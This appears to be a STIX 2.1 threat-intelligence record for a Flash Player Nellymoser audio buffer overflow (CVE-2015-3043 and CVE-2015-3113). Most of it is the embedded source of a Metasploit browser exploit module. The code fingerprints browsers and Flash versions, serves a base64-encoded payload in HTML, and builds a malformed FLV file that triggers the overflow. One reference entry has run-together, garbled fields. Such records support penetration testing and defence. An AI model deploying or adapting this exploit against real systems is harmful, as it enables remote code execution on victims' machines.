{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--546abda5-a57e-42c5-8344-a4fbe7fc31e1",
    "created": "2024-08-14T17:06:11.315458Z",
    "modified": "2024-08-14T17:06:11.315462Z",
    "name": "Adobe Flash Player Nellymoser Audio Decoding Buffer Overflow",
    "description": " This module exploits a buffer overflow on Adobe Flash Player when handling nellymoser encoded audio inside a FLV video, as exploited in the wild on June 2015. This module has been tested successfully on:  Windows 7 SP1 (32-bit), IE11 and Adobe Flash 18.0.0.160 Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 18.0.0.160 Windows 8.1, Firefox 38.0.5 and Adobe Flash 18.0.0.160 Linux Mint \"Rebecca\" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.466, and Ubuntu 14.04.2 LTS, Firefox 35.01, and Adobe Flash 11.2.202.466. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/adobe_flash_nellymoser_bof.rb",
            "external_id": "adobe_flash_nellymoser_bof.rb"
        },
        {
            "source_name": "earlierCVE-2015-3043",
            "external_id": "sinceCVE-2015-3113iseffectivelyaregression"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-3043"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-3113"
        },
        {
            "source_name": "reference",
            "url": "https://helpx.adobe.com/security/products/flash-player/apsb15-06.html"
        },
        {
            "source_name": "reference",
            "url": "https://helpx.adobe.com/security/products/flash-player/apsb15-14.html"
        },
        {
            "source_name": "reference",
            "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/new-adobe-zero-day-shares-same-root-cause-as-older-flaws/"
        },
        {
            "source_name": "reference",
            "url": "http://malware.dontneedcoffee.com/2015/06/cve-2015-3113-flash-up-to-1800160-and.html"
        },
        {
            "source_name": "reference",
            "url": "http://bobao.360.cn/learning/detail/357.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'                => 'Adobe Flash Player Nellymoser Audio Decoding Buffer Overflow',\n      'Description'         => %q{\n        This module exploits a buffer overflow on Adobe Flash Player when handling nellymoser\n        encoded audio inside a FLV video, as exploited in the wild on June 2015. This module\n        has been tested successfully on:\n\n        Windows 7 SP1 (32-bit), IE11 and Adobe Flash 18.0.0.160,\n        Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 18.0.0.160,\n        Windows 8.1, Firefox 38.0.5 and Adobe Flash 18.0.0.160,\n        Linux Mint \"Rebecca\" (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.466, and\n        Ubuntu 14.04.2 LTS, Firefox 35.01, and Adobe Flash 11.2.202.466.\n\n        Note that this exploit is effective against both CVE-2015-3113 and the\n        earlier CVE-2015-3043, since CVE-2015-3113 is effectively a regression\n        to the same root cause as CVE-2015-3043.\n      },\n      'License'             => MSF_LICENSE,\n      'Author'              =>\n        [\n          'Unknown', # Exploit in the wild\n          'juan vazquez' # msf module\n        ],\n      'References'          =>\n        [\n          ['CVE', '2015-3043'],\n          ['CVE', '2015-3113'],\n          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb15-06.html'],\n          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb15-14.html'],\n          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/new-adobe-zero-day-shares-same-root-cause-as-older-flaws/'],\n          ['URL', 'http://malware.dontneedcoffee.com/2015/06/cve-2015-3113-flash-up-to-1800160-and.html'],\n          ['URL', 'http://bobao.360.cn/learning/detail/357.html']\n        ],\n      'Payload'             =>\n        {\n          'DisableNops' => true\n        },\n      'Platform'            => ['win', 'linux'],\n      'Arch'                => [ARCH_X86],\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :arch    => ARCH_X86,\n          :os_name => lambda do |os|\n            os =~ OperatingSystems::Match::LINUX ||\n              os =~ OperatingSystems::Match::WINDOWS_7 ||\n              os =~ OperatingSystems::Match::WINDOWS_81\n          end,\n          :ua_name => lambda do |ua|\n            case target.name\n            when 'Windows'\n              return true if ua == Msf::HttpClients::IE || ua == Msf::HttpClients::FF\n            when 'Linux'\n              return true if ua == Msf::HttpClients::FF\n            end\n\n            false\n          end,\n          :flash   => lambda do |ver|\n            case target.name\n            when 'Windows'\n              return true if ver =~ /^18\\./ && Rex::Version.new(ver) <= Rex::Version.new('18.0.0.161')\n              return true if ver =~ /^17\\./ && Rex::Version.new(ver) != Rex::Version.new('17.0.0.169')\n            when 'Linux'\n              return true if ver =~ /^11\\./ && Rex::Version.new(ver) <= Rex::Version.new('11.2.202.466') && Rex::Version.new(ver) != Rex::Version.new('11.2.202.457')\n            end\n\n            false\n          end\n        },\n      'Targets'             =>\n        [\n          [ 'Windows',\n            {\n              'Platform' => 'win'\n            }\n          ],\n          [ 'Linux',\n            {\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'Privileged'          => false,\n      'DisclosureDate'      => '2015-06-23',\n      'DefaultTarget'       => 0))\n  end\n\n  def exploit\n    @swf = create_swf\n    @flv = create_flv\n\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status('Sending SWF...')\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    if request.uri =~ /\\.flv$/\n      print_status('Sending FLV...')\n      send_response(cli, @flv, {'Content-Type'=>'video/x-flv', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    print_status('Sending HTML...')\n    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})\n  end\n\n  def exploit_template(cli, target_info)\n    swf_random = \"#{rand_text_alpha(4 + rand(3))}.swf\"\n    target_payload = get_payload(cli, target_info)\n    b64_payload = Rex::Text.encode_base64(target_payload)\n    os_name = target_info[:os_name]\n\n    if target.name =~ /Windows/\n      platform_id = 'win'\n    elsif target.name =~ /Linux/\n      platform_id = 'linux'\n    end\n\n    html_template = %Q|<html>\n    <body>\n    <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" />\n    <param name=\"Play\" value=\"true\" />\n    <embed type=\"application/x-shockwave-flash\" width=\"1\" height=\"1\" src=\"<%=swf_random%>\" allowScriptAccess=\"always\" FlashVars=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" Play=\"true\"/>\n    </object>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def create_swf\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-3113', 'msf.swf')\n    swf =  ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\n\n  def create_flv\n    header = ''\n    header << 'FLV' # signature\n    header << [1].pack('C') # version\n    header << [4].pack('C') # Flags: TypeFlagsAudio\n    header << [9].pack('N') # DataOffset\n\n    data = ''\n    data << \"\\x68\" # fmt = 6 (Nellymoser), SoundRate: 2, SoundSize: 0, SoundType: 0\n    data << \"\\xee\" * 0x440 # SoundData\n\n    tag1 = ''\n    tag1 << [8].pack('C')  # TagType (audio)\n    tag1 << \"\\x00\\x04\\x41\" # DataSize\n    tag1 << \"\\x00\\x00\\x1a\" # TimeStamp\n    tag1 << [0].pack('C')  # TimeStampExtended\n    tag1 << \"\\x00\\x00\\x00\" # StreamID, always 0\n    tag1 << data\n\n    body = ''\n    body << [0].pack('N') # PreviousTagSize\n    body << tag1\n    body << [0xeeeeeeee].pack('N') # PreviousTagSize\n\n    flv = ''\n    flv << header\n    flv << body\n\n    flv\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2015-06-23",
    "x_mitre_platforms": [
        "linux"
    ]
}